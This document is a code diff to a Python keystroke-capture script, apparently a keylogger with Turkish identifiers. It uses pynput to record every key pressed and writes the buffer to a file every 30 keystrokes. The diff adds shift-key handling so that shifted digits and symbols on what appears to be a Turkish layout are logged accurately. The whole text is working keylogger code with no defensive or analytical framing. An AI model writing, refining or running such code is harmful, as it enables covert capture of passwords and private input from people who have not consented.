@@ -1,12 +1,28 @@
 from pynput.keyboard import Listener,Key
 liste=list()
 cpstatus=False
+shstatus=False
+
+shliste = ["=","!","'","^","+","%","&","/","(",")"]
+number="0123456789"
 def bas(key):
-    global liste,cpstatus
+    global liste,cpstatus,shstatus
     try:
-        if cpstatus:
-            liste.append(key.char.upper())
+     if shstatus:
+        if key.char in number:
+            liste.append(shliste[int(key.char)])
         else:
+            if key.char =="*":
+                liste.append("?")
+            elif key.char=="-":
+                liste.append("_")
+            elif not cpstatus:
+                liste.append(key.char.upper())
+            else:
+                liste.append(key.char)
+     elif cpstatus:
+            liste.append(key.char.upper())
+     else:
             liste.append(key.char)
 
     except AttributeError:
@@ -18,12 +34,17 @@ def bas(key):
             liste.append("'<-'")
         if key==Key.caps_lock:
             cpstatus=not cpstatus
+        if key==Key.shift_r or key==Key.shift_l:
+            shstatus=True
+
     if len(liste) >=30:
         dosya_yaz()
         liste=list()
 
 def birak(key):
-    pass
+    global shstatus
+    if key==Key.shift_r or key==Key.shift_l:
+        shstatus=False
 def dosya_yaz():
     global liste
 
